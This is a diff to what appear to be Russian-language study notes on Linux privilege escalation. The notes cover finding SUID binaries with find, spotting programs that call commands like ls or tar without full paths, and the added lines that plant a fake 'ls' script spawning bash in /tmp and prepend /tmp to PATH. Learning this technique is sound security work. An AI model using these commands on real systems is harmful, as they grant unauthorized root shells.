@@ -65,10 +65,12 @@ chmod 777 test
 find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
 Ответ должен быть:
 -rwsr-xr-x
+
 ✅ Она вызывает команды без полного пути (уязвимость в коде)
 Ищем вызовы типа: system("ls") а не system("/bin/ls")
 или
 tar -czf backup.tar.gz /home  # ОПАСНО!
+
 # Система ищет tar в PATH
 # Порядок: /usr/local/bin → /usr/bin → /bin
 # Если /usr/local/bin writable - можем подменить!
@@ -104,6 +106,14 @@ which ls
 echo $PATH
 Пример ответа команды:
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+Создаем скрипт:
+echo -e '#!/bin/bash\n/bin/bash' > /tmp/ls
+
+Подменяем PATH:
+export PATH=/tmp:$PATH
+
+или добавляем новый скрипт в /usr/local/bin (если writable)
 
 # В каком порядке проверяется?
 # 1. /usr/local/sbin/ls
